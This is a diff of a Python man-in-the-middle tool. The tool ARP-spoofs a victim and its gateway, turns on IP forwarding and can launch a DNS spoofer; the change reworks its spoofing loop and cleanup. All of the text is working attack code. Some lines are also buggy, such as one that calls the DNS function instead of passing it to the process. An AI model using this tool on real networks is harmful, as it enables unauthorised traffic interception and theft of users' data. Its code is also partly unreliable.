@@ -40,21 +40,16 @@ def spoofy():
 
     # Get target and host
     target, host = get_arguments()
-    try:
-        while True:
-            # Tell the victim that we are the gateway
-            spoof(target, host)
 
-            # Tell the gateway that we are the target (victim)
-            spoof(host, target)
+    while True:
+        # Tell the victim that we are the gateway
+        spoof(target, host)
 
-            # Sleep for a second to prevent a dos
-            time.sleep(1)
-    except KeyboardInterrupt:
-        # If CTRL + C is pressed, restore
-        print("[!!!] CTRL + C detected. Cleaning up. Please wait.")
-        restore(target, host)
-        restore(host, target)
+        # Tell the gateway that we are the target (victim)
+        spoof(host, target)
+
+        # Sleep for a second to prevent a dos
+        time.sleep(1)
         
         
 def main():
@@ -65,14 +60,23 @@ def main():
 
     # Enable ip forwarding for the system
     enable_ip_routing()
-    try:
-        arper = multiprocessing.Process(target=spoofy)
-        arper.start()
 
+    # Create processes
+    arper = multiprocessing.Process(target=spoofy)
+    dns_spoofer = multiprocessing.Process(target=dns_main())
+
+    # Start processes
+    try:
+        arper.start()
         if args.dns_spoof:
-            dns_spoofer = multiprocessing.Process(target=dns_main())
             dns_spoofer.start()
     except KeyboardInterrupt:
+        # Stop processes
+        arper.close()
+        if dns_spoofer.is_alive():
+            dns_spoofer.close()
+
+        # Restore the network
         restore(target, host)
         restore(host, target)
         if args.dns_spoof:
